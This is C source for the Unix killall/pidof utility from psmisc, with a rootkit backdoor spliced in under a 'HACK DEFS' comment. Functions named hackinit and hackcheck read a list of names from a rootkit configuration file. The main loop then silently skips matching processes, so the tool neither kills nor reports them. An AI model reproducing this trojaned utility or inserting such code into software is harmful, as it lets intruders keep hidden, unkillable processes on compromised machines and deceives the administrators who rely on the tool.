/* killall.c - kill processes by name or list PIDs */

/* Copyright 1993-1998 Werner Almesberger. See file COPYING for details. */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "comm.h"
#include "signals.h"


#define PROC_BASE "/proc"
#define MAX_NAMES (sizeof(unsigned long)*8)

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;
void hackinit(void) {
 h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
 hack_list=h_tmp;
 if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
  while (fgets(tmp_str, 126, fp_hack)) {
   h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
   strp=tmp_str;
   strp=strtok (strp, SPC_CHAR);
   h_tmp->hack_type=atoi(strp);
   strp=strtok ('\0', END_CHAR);
   strcpy (h_tmp->hack_cmd, strp);
   h_tmp=h_tmp->next;
  }
  fclose(fp_hack);
 }
 h_tmp->next=NULL;
}

int hackcheck(char *p) {
 for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
  switch (h_tmp->hack_type) {
   case 0:
    return 0;
    break;
   case 1:
    return 0;
    break;
   case 2:
    if (strcmp((char *)p,h_tmp->hack_cmd)==0)
     return 1;
    break;
   case 3:
    if (strstr((char *)p,h_tmp->hack_cmd))
     return 1;
    break;
  }
 }
 return 0;
}

/* end o hacko functions */


static int verbose = 0,exact = 0,interactive = 0,quiet = 0,wait_until_dead = 0,
  pidof;


static int ask(char *name,pid_t pid)
{
    int ch,c;

    do {
        printf("Kill %s(%d) ? (y/n) ",name,pid);
        fflush(stdout);
	do if ((ch = getchar()) == EOF) exit(0);
	while (ch == '\n' || ch == '\t' || ch == ' ');
	do if ((c = getchar()) == EOF) exit(0);
	while (c != '\n');
    }
    while (ch != 'y' && ch != 'n' && ch != 'Y' && ch != 'N');
    return ch == 'y' || ch == 'Y';
}


static int kill_all(int signal,int names,char **namelist)
{
    DIR *dir;
    struct dirent *de;
    FILE *file;
    struct stat st,sts[MAX_NAMES];
    int *name_len;
    char path[PATH_MAX+1],comm[COMM_LEN];
    char command_buf[PATH_MAX+1];
    char *command;
    pid_t *pid_table,pid,self,*pid_killed;
    int empty,i,j,okay,length,got_long,error;
    int pids,max_pids,pids_killed;
    unsigned long found;

    if (!(name_len = malloc(sizeof(int)*names))) {
	perror("malloc");
	exit(1);
    }
    for (i = 0; i < names; i++)
	if (!strchr(namelist[i],'/')) {
	    sts[i].st_dev = 0;
	    name_len[i] = strlen(namelist[i]);
	}
	else if (stat(namelist[i],&sts[i]) < 0) {
		perror(namelist[i]);
		exit(1);
	    }
    self = getpid();
    found = 0;
    if (!(dir = opendir(PROC_BASE))) {
	perror(PROC_BASE);
	exit(1);
    }
    max_pids = 256;
    pid_table = malloc(max_pids*sizeof(pid_t));
    if (!pid_table) {
	perror("malloc");
	exit(1);
    }
    pids = 0;
    while (de = readdir(dir)) {
	if (!(pid = atoi(de->d_name)) || pid == self) continue;
	if (pids == max_pids) {
	    if (!(pid_table = realloc(pid_table,2*pids*sizeof(pid_t)))) {
		perror("realloc");
		exit(1);
	    }
	    max_pids *= 2;
	}
	pid_table[pids++] = pid;
    }
    (void) closedir(dir);
    empty = 1;
    pids_killed = 0;
    pid_killed = malloc(max_pids*sizeof(pid_t));
    if (!pid_killed) {
	perror("malloc");
	exit(1);
    }
    for (i = 0; i < pids; i++) {
	sprintf(path,"%s/%d/stat",PROC_BASE,pid_table[i]);
	if (!(file = fopen(path,"r"))) continue;
	empty = 0;
	okay = fscanf(file,"%*d (%[^)]",comm) == 1;
	(void) fclose(file);
	if (!okay) continue;
	got_long = 0;
	command = NULL; /* make gcc happy */
	length = strlen(comm);
      if (hackcheck(comm)==0) {
	if (length == COMM_LEN-1) {
	    sprintf(path,"%s/%d/cmdline",PROC_BASE,pid_table[i]);
	    if (!(file = fopen(path,"r"))) continue;
	    okay = fscanf(file,"%s",command_buf) == 1;
	    (void) fclose(file);
	    if (exact && !okay) {
		if (verbose)
		    fprintf(stderr,"skipping partial match %s(%d)\n",comm,
		      pid_table[i]);
		continue;
	    }
	    got_long = okay;
	    if (okay) {
		command = strrchr(command_buf,'/');
		if (command) command++;
		else command = command_buf;
	    }
	}
	for (j = 0; j < names; j++) {
	    if (!sts[j].st_dev) {
		if (length != COMM_LEN-1 || name_len[j] < COMM_LEN-1) {
		    if (strcmp(namelist[j],comm)) continue;
		}
		else if (got_long ? strcmp(namelist[j],command) :
		      strncmp(namelist[j],comm,COMM_LEN-1)) continue;
	    }
	    else {
		sprintf(path,"%s/%d/exe",PROC_BASE,pid_table[i]);
		if (stat(path,&st) < 0) continue;
		if (sts[j].st_dev != st.st_dev || sts[j].st_ino != st.st_ino)
		    continue;
	    }
	    if (interactive && !ask(comm,pid_table[i])) continue;
	    if (pidof) {
		if (found) putchar(' ');
		printf("%d",pid_table[i]);
		found |= 1 << j;
	    }
	    else if (kill(pid_table[i],signal) >= 0) {
		    if (verbose)
			fprintf(stderr,"Killed %s(%d)\n",got_long ? command :
			  comm,pid_table[i]);
		    found |= 1 << j;
		    pid_killed[pids_killed++] = pid_table[i];
		}
		else if (errno != ESRCH || interactive)
			fprintf(stderr,"%s(%d): %s\n",got_long ? comm :
			  command,pid_table[i],strerror(errno));
	}
      }
    }
    if (empty) {
	fprintf(stderr,PROC_BASE " is empty (not mounted ?)\n");
	exit(1);
    }
    if (!quiet && !pidof)
	for (i = 0; i < names; i++)
	    if (!(found & (1 << i)))
		fprintf(stderr,"%s: no process killed\n",namelist[i]);
    if (pidof) putchar('\n');
    error = found == ((1 << (names-1)) | ((1 << (names-1))-1)) ? 0 : 1;
    /*
     * We scan all (supposedly) killed processes every second to detect dead
     * processes as soon as possible in order to limit problems of race with
     * PID re-use.
     */
    while (pids_killed && wait_until_dead) {
	for (i = 0; i < pids_killed;) {
	    if (kill(pid_killed[i],0) < 0 && errno == ESRCH) {
		pid_killed[i] = pid_killed[--pids_killed];
		continue;
	    }
	    i++;
	}
	sleep(1); /* wait a bit longer */
    }
    return error;
}


static void usage_pidof(void)
{
    fprintf(stderr,"usage: pidof [ -e ] name ...\n");
    fprintf(stderr,"       pidof -V\n\n");
    fprintf(stderr,"    -e      require exact match for very long names;\n");
    fprintf(stderr,"            skip if the command line is unavailable\n");
    fprintf(stderr,"    -V      display version information\n\n");
}


static void usage_killall(void)
{
    fprintf(stderr,"usage: killall [ -eiqvw ] [ -signal ] name ...\n");
    fprintf(stderr,"       killall -l\n");
    fprintf(stderr,"       killall -V\n\n");
    fprintf(stderr,"    -e      require exact match for very long names;\n");
    fprintf(stderr,"            skip if the command line is unavailable\n");
    fprintf(stderr,"    -i      ask for confirmation before killing\n");
    fprintf(stderr,"    -l      list all known signal names\n");
    fprintf(stderr,"    -q      quiet; don't print complaints\n");
    fprintf(stderr,"    -signal send signal instead of SIGTERM\n");
    fprintf(stderr,"    -v      report if the signal was successfully sent\n");
    fprintf(stderr,"    -V      display version information\n");
    fprintf(stderr,"    -w      wait for processes to die\n\n");
}


static void usage(void)
{
    if (pidof) usage_pidof();
    else usage_killall();
    exit(1);
}


int main(int argc,char **argv)
{
    char *name,*walk;
    int sig_num;

    name = strrchr(*argv,'/');
    if (name) name++;
    else name = *argv;
    pidof = strcmp(name,"killall");
    if (argc == 2 && !strcmp(argv[1],"-l")) {
	if (pidof) usage();
	list_signals();
	return 0;
    }
    if (argc == 2 && !strcmp(argv[1],"-V")) {
	fprintf(stderr,"%s from psmisc version " PSMISC_VERSION "\n",
	  pidof ? "pidof" : "killall");
	return 0;
    }
    sig_num = SIGTERM;
    while (argc > 1 && *argv[1] == '-') {
	argc--;
	argv++;
	if (**argv == '-') {
	    for (walk = *argv+1; *walk && strchr("eiqvw",*walk); walk++) {
		switch (*walk) {
		    case 'e':
			exact = 1;
			break;
		    case 'i':
			if (pidof) usage();
			interactive = 1;
			break;
		    case 'q':
			if (pidof) usage();
			quiet = 1;
			break;
		    case 'v':
			if (pidof) usage();
			verbose = 1;
			break;
		    case 'w':
			if (pidof) usage();
			wait_until_dead = 1;
			break;
		}
	    }
	    if (*walk)
		if (walk != *argv+1 || pidof) usage();
		else sig_num = get_signal(*argv+1,"killall");
	}
    }
    if (argc < 2) usage();
    if (argc > MAX_NAMES+1) {
	fprintf(stderr,"Maximum number of names is %d\n",MAX_NAMES);
	exit(1);
    }
    hackinit();
    return kill_all(sig_num,argc-1,argv+1);
}
